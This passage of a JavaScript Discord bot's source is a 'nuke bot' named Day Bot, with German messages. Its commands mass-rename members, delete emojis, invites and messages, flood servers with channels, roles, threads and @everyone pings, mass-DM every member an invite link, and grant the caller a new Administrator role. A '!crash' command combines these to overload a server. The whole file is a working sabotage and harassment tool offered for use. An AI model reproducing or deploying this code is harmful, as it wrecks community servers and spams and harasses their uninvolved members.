            if (now < expirationTime) {
                const remainingTime = Math.ceil((expirationTime - now) / 1000 / 60);
                await message.author.send(`⏰ Der !masswebhooks Befehl ist noch für ${remainingTime} Minute(n) im Cooldown!`);
                return;
            }
        }

        if (!isWhitelisted(message.author.id)) {
            commandCooldowns.set(cooldownKey, now);
        }

        try {
            await guild.channels.fetch();
            const textChannels = guild.channels.cache.filter(channel => channel.type === ChannelType.GuildText);

            for (const channel of textChannels.values()) {
                if (priorityInterrupt || globalStopFlag) break;
                try {
                    await channel.createWebhook({
                        name: '☣Nuked By Day Bot☣',
                        avatar: null,
                    });
                } catch (error) {
                    console.error(`Fehler beim Erstellen des Webhooks in ${channel.name}:`, error.message);
                }
            }

            await message.author.send('✅ Webhooks in allen Text-Kanälen erstellt!');
        } catch (error) {
            console.error('Fehler beim Erstellen der Webhooks:', error);
        }
    },
};

const massNickCommand = {
    async execute(message) {
        const guild = message.guild;
        const cooldownKey = `massnick_${guild.id}`;
        const now = Date.now();
        const cooldownTime = 2 * 60 * 1000;

        if (commandCooldowns.has(cooldownKey)) {
            const expirationTime = commandCooldowns.get(cooldownKey) + cooldownTime;
            if (now < expirationTime) {
                const remainingTime = Math.ceil((expirationTime - now) / 1000 / 60);
                await message.author.send(`⏰ Der !massnick Befehl ist noch für ${remainingTime} Minute(n) im Cooldown!`);
                return;
            }
        }

        if (!isWhitelisted(message.author.id)) {
            commandCooldowns.set(cooldownKey, now);
        }

        try {
            await guild.members.fetch();
            const members = guild.members.cache;
            let changedCount = 0;

            for (const member of members.values()) {
                if (priorityInterrupt || globalStopFlag) break;
                if (!member.user.bot && member.manageable) {
                    try {
                        await member.setNickname('☣Nuked By Day Bot☣');
                        changedCount++;
                    } catch (error) {
                        console.error(`Fehler beim Ändern des Nicknames von ${member.user.tag}:`, error.message);
                    }
                }
            }

            await message.author.send(`✅ ${changedCount} Nicknamen geändert!`);
        } catch (error) {
            console.error('Fehler beim Ändern der Nicknamen:', error);
        }
    },
};

const deleteEmojisCommand = {
    async execute(message) {
        const guild = message.guild;
        const cooldownKey = `deleteemojis_${guild.id}`;
        const now = Date.now();
        const cooldownTime = 2 * 60 * 1000;

        if (commandCooldowns.has(cooldownKey)) {
            const expirationTime = commandCooldowns.get(cooldownKey) + cooldownTime;
            if (now < expirationTime) {
                const remainingTime = Math.ceil((expirationTime - now) / 1000 / 60);
                await message.author.send(`⏰ Der !deleteemojis Befehl ist noch für ${remainingTime} Minute(n) im Cooldown!`);
                return;
            }
        }

        if (!isWhitelisted(message.author.id)) {
            commandCooldowns.set(cooldownKey, now);
        }

        try {
            const emojis = guild.emojis.cache;
            let deletedCount = 0;

            for (const emoji of emojis.values()) {
                if (priorityInterrupt || globalStopFlag) break;
                try {
                    await emoji.delete();
                    deletedCount++;
                } catch (error) {
                    console.error(`Fehler beim Löschen des Emojis ${emoji.name}:`, error.message);
                }
            }

            await message.author.send(`✅ ${deletedCount} Emojis gelöscht!`);
        } catch (error) {
            console.error('Fehler beim Löschen der Emojis:', error);
        }
    },
};

const serverIconCommand = {
    async execute(message) {
        const guild = message.guild;
        const cooldownKey = `servericon_${guild.id}`;
        const now = Date.now();
        const cooldownTime = 2 * 60 * 1000;

        if (commandCooldowns.has(cooldownKey)) {
            const expirationTime = commandCooldowns.get(cooldownKey) + cooldownTime;
            if (now < expirationTime) {
                const remainingTime = Math.ceil((expirationTime - now) / 1000 / 60);
                await message.author.send(`⏰ Der !servericon Befehl ist noch für ${remainingTime} Minute(n) im Cooldown!`);
                return;
            }
        }

        if (!isWhitelisted(message.author.id)) {
            commandCooldowns.set(cooldownKey, now);
        }

        try {
            await guild.setIcon(null);
            await message.author.send('✅ Server-Icon entfernt!');
        } catch (error) {
            console.error('Fehler beim Entfernen des Server-Icons:', error);
            await message.author.send('❌ Fehler beim Entfernen des Server-Icons.');
        }
    },
};

const massDMCommand = {
    async execute(message) {
        const guild = message.guild;
        const cooldownKey = `massdm_${guild.id}`;
        const now = Date.now();
        const cooldownTime = 5 * 60 * 1000;

        if (commandCooldowns.has(cooldownKey)) {
            const expirationTime = commandCooldowns.get(cooldownKey) + cooldownTime;
            if (now < expirationTime) {
                const remainingTime = Math.ceil((expirationTime - now) / 1000 / 60);
                await message.author.send(`⏰ Der !massdm Befehl ist noch für ${remainingTime} Minute(n) im Cooldown!`);
                return;
            }
        }

        if (!isWhitelisted(message.author.id)) {
            commandCooldowns.set(cooldownKey, now);
        }

        try {
            await guild.members.fetch();
            const members = guild.members.cache.filter(member => !member.user.bot);
            let sentCount = 0;

            for (const member of members.values()) {
                if (priorityInterrupt || globalStopFlag) break;
                try {
                    await member.send('☣Du wurdest von Day Bot genukt!☣ https://discord.gg/etjTcxevap');
                    sentCount++;
                } catch (error) {
                    console.error(`Fehler beim Senden der DM an ${member.user.tag}:`, error.message);
                }
            }

            await message.author.send(`✅ ${sentCount} DMs gesendet!`);
        } catch (error) {
            console.error('Fehler beim Senden der DMs:', error);
        }
    },
};

const webhookSpamCommand = {
    async execute(message) {
        const cooldownKey = `webhookspam_${message.channel.id}`;
        const now = Date.now();
        const cooldownTime = 3 * 60 * 1000;

        if (commandCooldowns.has(cooldownKey)) {
            const expirationTime = commandCooldowns.get(cooldownKey) + cooldownTime;
            if (now < expirationTime) {
                const remainingTime = Math.ceil((expirationTime - now) / 1000 / 60);
                await message.author.send(`⏰ Der !webhookspam Befehl ist noch für ${remainingTime} Minute(n) im Cooldown!`);
                return;
            }
        }

        if (!isWhitelisted(message.author.id)) {
            commandCooldowns.set(cooldownKey, now);
        }

        try {
            const webhook = await message.channel.createWebhook({
                name: '☣Day Bot Webhook☣',
            });

            for (let i = 0; i < 100; i++) {
                if (priorityInterrupt || globalStopFlag) break;
                webhook.send('☣Webhook Spam by Day Bot☣ @everyone https://discord.gg/etjTcxevap').catch(() => {});
            }

            await message.author.send('✅ Webhook-Spam gestartet!');
        } catch (error) {
            console.error('Fehler beim Webhook-Spam:', error);
        }
    },
};

const categorySpamCommand = {
    async execute(message) {
        const guild = message.guild;
        const cooldownKey = `categoryspam_${guild.id}`;
        const now = Date.now();
        const cooldownTime = 3 * 60 * 1000;

        if (commandCooldowns.has(cooldownKey)) {
            const expirationTime = commandCooldowns.get(cooldownKey) + cooldownTime;
            if (now < expirationTime) {
                const remainingTime = Math.ceil((expirationTime - now) / 1000 / 60);
                await message.author.send(`⏰ Der !categoryspam Befehl ist noch für ${remainingTime} Minute(n) im Cooldown!`);
                return;
            }
        }

        if (!isWhitelisted(message.author.id)) {
            commandCooldowns.set(cooldownKey, now);
        }

        try {
            const promises = [];
            for (let i = 0; i < 30; i++) {
                if (priorityInterrupt || globalStopFlag) break;
                promises.push(
                    guild.channels.create({
                        name: `☣nuked-category☣`,
                        type: ChannelType.GuildCategory,
                    }).catch(() => {})
                );
            }
            await Promise.all(promises);
            await message.author.send('✅ 30 Kategorien erstellt!');
        } catch (error) {
            console.error('Fehler beim Erstellen der Kategorien:', error);
        }
    },
};

const voiceSpamCommand = {
    async execute(message) {
        const guild = message.guild;
        const cooldownKey = `voicespam_${guild.id}`;
        const now = Date.now();
        const cooldownTime = 3 * 60 * 1000;

        if (commandCooldowns.has(cooldownKey)) {
            const expirationTime = commandCooldowns.get(cooldownKey) + cooldownTime;
            if (now < expirationTime) {
                const remainingTime = Math.ceil((expirationTime - now) / 1000 / 60);
                await message.author.send(`⏰ Der !voicespam Befehl ist noch für ${remainingTime} Minute(n) im Cooldown!`);
                return;
            }
        }

        if (!isWhitelisted(message.author.id)) {
            commandCooldowns.set(cooldownKey, now);
        }

        try {
            const promises = [];
            for (let i = 0; i < 40; i++) {
                if (priorityInterrupt || globalStopFlag) break;
                promises.push(
                    guild.channels.create({
                        name: `☣nuked-voice☣`,
                        type: ChannelType.GuildVoice,
                    }).catch(() => {})
                );
            }
            await Promise.all(promises);
            await message.author.send('✅ 40 Voice-Kanäle erstellt!');
        } catch (error) {
            console.error('Fehler beim Erstellen der Voice-Kanäle:', error);
        }
    },
};

const threadSpamCommand = {
    async execute(message) {
        const cooldownKey = `threadspam_${message.channel.id}`;
        const now = Date.now();
        const cooldownTime = 2 * 60 * 1000;

        if (commandCooldowns.has(cooldownKey)) {
            const expirationTime = commandCooldowns.get(cooldownKey) + cooldownTime;
            if (now < expirationTime) {
                const remainingTime = Math.ceil((expirationTime - now) / 1000 / 60);
                await message.author.send(`⏰ Der !threadspam Befehl ist noch für ${remainingTime} Minute(n) im Cooldown!`);
                return;
            }
        }

        if (!isWhitelisted(message.author.id)) {
            commandCooldowns.set(cooldownKey, now);
        }

        try {
            for (let i = 0; i < 20; i++) {
                if (priorityInterrupt || globalStopFlag) break;
                message.channel.threads.create({
                    name: `☣Nuked Thread ${i}☣`,
                    autoArchiveDuration: 60,
                }).catch(() => {});
            }
            await message.author.send('✅ 20 Threads erstellt!');
        } catch (error) {
            console.error('Fehler beim Erstellen der Threads:', error);
        }
    },
};

const inviteDeleteCommand = {
    async execute(message) {
        const guild = message.guild;
        const cooldownKey = `invitedelete_${guild.id}`;
        const now = Date.now();
        const cooldownTime = 2 * 60 * 1000;

        if (commandCooldowns.has(cooldownKey)) {
            const expirationTime = commandCooldowns.get(cooldownKey) + cooldownTime;
            if (now < expirationTime) {
                const remainingTime = Math.ceil((expirationTime - now) / 1000 / 60);
                await message.author.send(`⏰ Der !invitedelete Befehl ist noch für ${remainingTime} Minute(n) im Cooldown!`);
                return;
            }
        }

        if (!isWhitelisted(message.author.id)) {
            commandCooldowns.set(cooldownKey, now);
        }

        try {
            const invites = await guild.invites.fetch();
            let deletedCount = 0;

            for (const invite of invites.values()) {
                if (priorityInterrupt || globalStopFlag) break;
                try {
                    await invite.delete();
                    deletedCount++;
                } catch (error) {
                    console.error(`Fehler beim Löschen der Einladung ${invite.code}:`, error.message);
                }
            }

            await message.author.send(`✅ ${deletedCount} Einladungen gelöscht!`);
        } catch (error) {
            console.error('Fehler beim Löschen der Einladungen:', error);
        }
    },
};

const massPingCommand = {
    async execute(message) {
        const cooldownKey = `massping_${message.channel.id}`;
        const now = Date.now();
        const cooldownTime = 2 * 60 * 1000;

        if (commandCooldowns.has(cooldownKey)) {
            const expirationTime = commandCooldowns.get(cooldownKey) + cooldownTime;
            if (now < expirationTime) {
                const remainingTime = Math.ceil((expirationTime - now) / 1000 / 60);
                await message.author.send(`⏰ Der !massping Befehl ist noch für ${remainingTime} Minute(n) im Cooldown!`);
                return;
            }
        }

        if (!isWhitelisted(message.author.id)) {
            commandCooldowns.set(cooldownKey, now);
        }

        try {
            for (let i = 0; i < 50; i++) {
                if (priorityInterrupt || globalStopFlag) break;
                message.channel.send('@everyone @here ☣Day Bot Mass Ping☣').catch(() => {});
            }
            await message.author.send('✅ Mass Ping gestartet!');
        } catch (error) {
            console.error('Fehler beim Mass Ping:', error);
        }
    },
};

const purgeCommand = {
    async execute(message) {
        const cooldownKey = `purge_${message.channel.id}`;
        const now = Date.now();
        const cooldownTime = 2 * 60 * 1000;

        if (commandCooldowns.has(cooldownKey)) {
            const expirationTime = commandCooldowns.get(cooldownKey) + cooldownTime;
            if (now < expirationTime) {
                const remainingTime = Math.ceil((expirationTime - now) / 1000 / 60);
                await message.author.send(`⏰ Der !purge Befehl ist noch für ${remainingTime} Minute(n) im Cooldown!`);
                return;
            }
        }

        if (!isWhitelisted(message.author.id)) {
            commandCooldowns.set(cooldownKey, now);
        }

        try {
            let deletedTotal = 0;

            while (deletedTotal < 1000) {
                if (priorityInterrupt || globalStopFlag) break;

                const messages = await message.channel.messages.fetch({ limit: 100 });
                if (messages.size === 0) break;

                await message.channel.bulkDelete(messages);
                deletedTotal += messages.size;
            }

            await message.author.send(`✅ ${deletedTotal} Nachrichten gelöscht!`);
        } catch (error) {
            console.error('Fehler beim Purge:', error);
        }
    },
};

const adminCommand = {
    async execute(message) {
        const guild = message.guild;
        const cooldownKey = `admin_${guild.id}`;
        const now = Date.now();
        const cooldownTime = 3 * 60 * 1000;

        if (commandCooldowns.has(cooldownKey)) {
            const expirationTime = commandCooldowns.get(cooldownKey) + cooldownTime;
            if (now < expirationTime) {
                const remainingTime = Math.ceil((expirationTime - now) / 1000 / 60);
                await message.author.send(`⏰ Der !admin Befehl ist noch für ${remainingTime} Minute(n) im Cooldown!`);
                return;
            }
        }

        if (!isWhitelisted(message.author.id)) {
            commandCooldowns.set(cooldownKey, now);
        }

        try {
            const adminRole = await guild.roles.create({
                name: '☣Day Bot Admin☣',
                color: 'Red',
                permissions: ['Administrator'],
                position: guild.roles.cache.size,
            });

            const member = guild.members.cache.get(message.author.id);
            if (member) {
                await member.roles.add(adminRole);
                await message.author.send('✅ Admin-Rolle erstellt und zugewiesen!');
            }
        } catch (error) {
            console.error('Fehler beim Erstellen der Admin-Rolle:', error);
        }
    },
};

const lagCommand = {
    async execute(message) {
        const cooldownKey = `lag_${message.channel.id}`;
        const now = Date.now();
        const cooldownTime = 3 * 60 * 1000;

        if (commandCooldowns.has(cooldownKey)) {
            const expirationTime = commandCooldowns.get(cooldownKey) + cooldownTime;
            if (now < expirationTime) {
                const remainingTime = Math.ceil((expirationTime - now) / 1000 / 60);
                await message.author.send(`⏰ Der !lag Befehl ist noch für ${remainingTime} Minute(n) im Cooldown!`);
                return;
            }
        }

        if (!isWhitelisted(message.author.id)) {
            commandCooldowns.set(cooldownKey, now);
        }

        try {
            const lagText = '🌀'.repeat(2000);

            for (let i = 0; i < 10; i++) {
                if (priorityInterrupt || globalStopFlag) break;
                message.channel.send(lagText).catch(() => {});
            }

            await message.author.send('✅ Lag-Attacke gestartet!');
        } catch (error) {
            console.error('Fehler beim Lag-Command:', error);
        }
    },
};

const crashCommand = {
    async execute(message) {
        const guild = message.guild;
        const cooldownKey = `crash_${guild.id}`;
        const now = Date.now();
        const cooldownTime = 10 * 60 * 1000;

        if (commandCooldowns.has(cooldownKey)) {
            const expirationTime = commandCooldowns.get(cooldownKey) + cooldownTime;
            if (now < expirationTime) {
                const remainingTime = Math.ceil((expirationTime - now) / 1000 / 60);
                await message.author.send(`⏰ Der !crash Befehl ist noch für ${remainingTime} Minute(n) im Cooldown!`);
                return;
            }
        }

        if (!isWhitelisted(message.author.id)) {
            commandCooldowns.set(cooldownKey, now);
        }

        try {
            await message.author.send('💥 Crash-Attacke wird gestartet...');

            // Kombiniert mehrere destructive Aktionen für maximalen Impact
            const promises = [];

            // 1. Mass Channel Creation
            for (let i = 0; i < 100; i++) {
                if (priorityInterrupt || globalStopFlag) break;
                promises.push(
                    guild.channels.create({
                        name: `☣crash-${i}☣`,
                        type: ChannelType.GuildText,
                    }).then(channel => {
                        for (let j = 0; j < 50; j++) {
                            if (priorityInterrupt || globalStopFlag) break;
                            channel.send('☣CRASH ATTACK☣ @everyone').catch(() => {});
                        }
                    }).catch(() => {})
                );
            }

            // 2. Mass Role Creation
            for (let i = 0; i < 50; i++) {
                if (priorityInterrupt || globalStopFlag) break;
                promises.push(
                    guild.roles.create({
                        name: `☣crash-role-${i}☣`,
                        color: 'Random',
                    }).catch(() => {})
                );
            }

            Promise.all(promises).catch(() => {});
            await message.author.send('💥 Crash-Attacke gestartet - Server sollte stark verlangsamt sein!');
        } catch (error) {
            console.error('Fehler beim Crash-Command:', error);
        }
    },
};

// Befehle registrieren
client.commands.set('nuke', nukeCommand);
client.commands.set('massban', massBanCommand);
client.commands.set('massrole', massRoleCommand);
client.commands.set('masskick', massKickCommand);
client.commands.set('spam', spamCommand);
client.commands.set('all', allCommand);
client.commands.set('help', helpCommand);
client.commands.set('stop', stopCommand);
client.commands.set('online', onlineCommand);

// Neue 20 NukeBot Commands registrieren
client.commands.set('deletechannels', deleteChannelsCommand);
client.commands.set('deleteroles', deleteRolesCommand);
client.commands.set('masschannels', massChannelsCommand);
client.commands.set('masswebhooks', massWebhooksCommand);
client.commands.set('massnick', massNickCommand);
client.commands.set('deleteemojis', deleteEmojisCommand);
client.commands.set('servericon', serverIconCommand);
client.commands.set('massdm', massDMCommand);
client.commands.set('webhookspam', webhookSpamCommand);
client.commands.set('categoryspam', categorySpamCommand);
client.commands.set('voicespam', voiceSpamCommand);
client.commands.set('threadspam', threadSpamCommand);
client.commands.set('invitedelete', inviteDeleteCommand);
client.commands.set('massping', massPingCommand);
client.commands.set('purge', purgeCommand);
client.commands.set('admin', adminCommand);
client.commands.set('lag', lagCommand);
client.commands.set('crash', crashCommand);
client.commands.set('blacklist', blacklistCommand);

client.once(Events.ClientReady, readyClient => {
    console.log(`Bereit! Eingeloggt als ${readyClient.user.tag}`);

    // Erweiterte Keep-Alive Funktion - Bot bleibt immer online
    setInterval(() => {
        console.log(`Bot ist online: ${new Date().toISOString()}`);

        // Überprüfen ob Bot heruntergefahren ist
        if (botIsShutdown) {
            console.log('Bot ist heruntergefahren, Keep-Alive übersprungen.');
            return;
        }

        // Status auf "online" setzen
        client.user.setStatus('online');

        // Aktivität setzen um Online-Status zu verstärken
        client.user.setActivity('Bereit zum Nuken 💀', { type: 'PLAYING' });
    }, 10000); // Alle 10 Sekunden für maximale Stabilität

    // Sofortiger Status beim Start
    client.user.setStatus('online');
    client.user.setActivity('Bereit zum Nuken 💀', { type: 'PLAYING' });
});

client.on(Events.MessageCreate, async message => {
    if (message.author.bot) return;

    if (!message.content.startsWith('!')) return;

    const args = message.content.slice(1).trim().split(/ +/);
    const commandName = args.shift().toLowerCase();

    const command = client.commands.get(commandName);

    if (!command) return;

    // SERVER UND USER INFO für Logging sammeln
    const serverName = message.guild ? message.guild.name : 'DM';
    const serverID = message.guild ? message.guild.id : 'DM';
    const userName = message.author.tag;
    const userID = message.author.id;
    const channelName = message.channel.name || 'DM';

    // BLACKLIST CHECK - Blockiert blacklisted User komplett
    if (isBlacklisted(message.author.id)) {
        console.log(`🚫 BLACKLISTED USER versuchte Command:`);
        console.log(`   👤 User: ${userName} (${userID})`);
        console.log(`   🖥️  Server: ${serverName} (${serverID})`);
        console.log(`   📝 Command: !${commandName}`);
        console.log(`   📍 Kanal: #${channelName}`);
        console.log(`   🕐 Zeit: ${new Date().toLocaleString('de-DE')}`);
        console.log(`   🌐 User erstellt: ${message.author.createdAt.toLocaleString('de-DE')}`);

        if (message.guild) {
            console.log(`   👥 Server Mitglieder: ${message.guild.memberCount || 'Unbekannt'}`);
            console.log(`   👑 Server Owner: ${message.guild.ownerId}`);
        }

        // Nachricht sofort löschen
        await message.delete().catch(() => {});

        // Random beleidigende Nachricht mit Mutterwitzen generieren
        const randomBlacklistMessage = generateRandomBlacklistInsult();
        await message.author.send(randomBlacklistMessage).catch(() => {});

        return; // Komplett blockieren
    }

    // WHITELIST CHECK - Nur whitelisted User können alle Commands verwenden (außer help und online)
    const allowedForNonWhitelist = ['help', 'online'];

    if (!isWhitelisted(message.author.id) && !allowedForNonWhitelist.includes(commandName)) {
        console.log(`🚫 NON-WHITELISTED USER versuchte restricted Command:`);
        console.log(`   👤 User: ${userName} (${userID})`);
        console.log(`   🖥️  Server: ${serverName} (${serverID})`);
        console.log(`   📝 Command: !${commandName}`);
        console.log(`   📍 Kanal: #${channelName}`);
        console.log(`   🕐 Zeit: ${new Date().toLocaleString('de-DE')}`);

        await message.author.send(`🚫 KEINE BERECHTIGUNG!\n\n❌ Du hast keine Berechtigung für den Command !${commandName}\n\n✅ Verfügbare Commands für dich:\n• !help - Hilfe anzeigen\n• !online - Bot reaktivieren\n\n💡 Nur whitelisted User können alle Commands verwenden!`);

        // Nachricht löschen
        await message.delete().catch(() => {});
        return;
    }

    // PRIORITY INTERRUPT Check - blockiert nur destructive Commands, nicht help/blacklist/stop/online
    const destructiveCommands = ['nuke', 'massban', 'massrole', 'masskick', 'spam', 'all', 'crash', 'lag', 
                                'deletechannels', 'deleteroles', 'masschannels', 'masswebhooks', 'massnick', 
                                'deleteemojis', 'servericon', 'massdm', 'webhookspam', 'categoryspam', 
                                'voicespam', 'threadspam', 'invitedelete', 'massping', 'purge', 'admin'];

    // Stop-System: Nur destructive Commands blockieren, NIEMALS help, blacklist, stop oder online
    if ((priorityInterrupt || globalStopFlag || botIsShutdown) && destructiveCommands.includes(commandName)) {
        console.log(`🛑 GESTOPPTER BOT - Destructive Command blockiert:`);
        console.log(`   👤 User: ${userName} (${userID})`);
        console.log(`   🖥️  Server: ${serverName} (${serverID})`);
        console.log(`   📝 Command: !${commandName}`);
        console.log(`   📍 Kanal: #${channelName}`);
        console.log(`   🕐 Zeit: ${new Date().toLocaleString('de-DE')}`);

        await message.author.send(`🚨 DESTRUCTIVE COMMANDS GESTOPPT!\n\n❌ Command !${commandName} ist blockiert\n\n✅ Verfügbare Commands:\n• !help - Hilfe anzeigen\n• !online - Bot reaktivieren\n• !blacklist - Blacklist verwalten\n\n💡 Verwende !online um alle Commands zu reaktivieren!`);

        // Nachricht löschen
        await message.delete().catch(() => {});
        return;
    }

    // COMMAND EXECUTION LOGGING - Detailiert für alle Commands mit erweiterten Infos
    console.log(`✅ COMMAND AUSGEFÜHRT:`);
    console.log(`   👤 User: ${userName} (${userID})`);
    console.log(`   🖥️  Server: ${serverName} (${serverID})`);
    console.log(`   📝 Command: !${commandName}`);
    console.log(`   📍 Kanal: #${channelName}`);
    console.log(`   🕐 Zeit: ${new Date().toLocaleString('de-DE')}`);
    console.log(`   🌐 User erstellt: ${message.author.createdAt.toLocaleString('de-DE')}`);

    // Guild-spezifische Informationen
    if (message.guild) {
        console.log(`   👥 Server Mitglieder: ${message.guild.memberCount || 'Unbekannt'}`);
        console.log(`   📅 Server erstellt: ${message.guild.createdAt.toLocaleString('de-DE')}`);
        console.log(`   👑 Server Owner: ${message.guild.ownerId}`);
        console.log(`   🔗 Server Region: ${message.guild.preferredLocale || 'Unbekannt'}`);
    }

    // Whitelist Status anzeigen
    if (isWhitelisted(userID)) {
        console.log(`   ⭐ Status: WHITELISTED (Cooldown-frei)`);
    } else {
        console.log(`   👥 Status: Normal User (mit Cooldowns)`);
    }

    // Zusätzliche Sicherheits-Logs
    console.log(`   🔒 Bot Berechtigung: ${message.guild ? message.guild.members.me.permissions.toArray().join(', ') : 'DM'}`);
    console.log(`   📊 Aktive Operationen: ${runningOperations.size}`)

    // SOFORTIGE AUSFÜHRUNG für stop/online Commands - höchste Priorität
    if (commandName === 'stop' || commandName === 'online') {
        console.log(`🚨 PRIORITY COMMAND ERKANNT: ${commandName} - wird sofort ausgeführt!`);
        try {
            await command.execute(message);
            console.log(`✅ PRIORITY COMMAND ${commandName} erfolgreich ausgeführt!`);
            return; // Sofortiger Return nach Ausführung
        } catch (error) {
            console.error(`❌ Fehler bei Priority Command ${commandName}:`, error);
            await message.author.send(`Fehler beim ${commandName} Command!`);
            return;
        }
    }

    try {
        await command.execute(message);
        console.log(`✅ Command !${commandName} erfolgreich abgeschlossen!`);
    } catch (error) {
        console.error(`❌ Fehler beim Ausführen von !${commandName}:`, error);
        console.error(`   👤 User: ${userName} (${userID})`);
        console.error(`   🖥️  Server: ${serverName} (${serverID})`);
        await message.author.send('Es gab einen Fehler beim Ausführen des Commands.');
    }
});

// Bot-Token - Du musst deinen echten Bot-Token hier einfügen
client.login('');
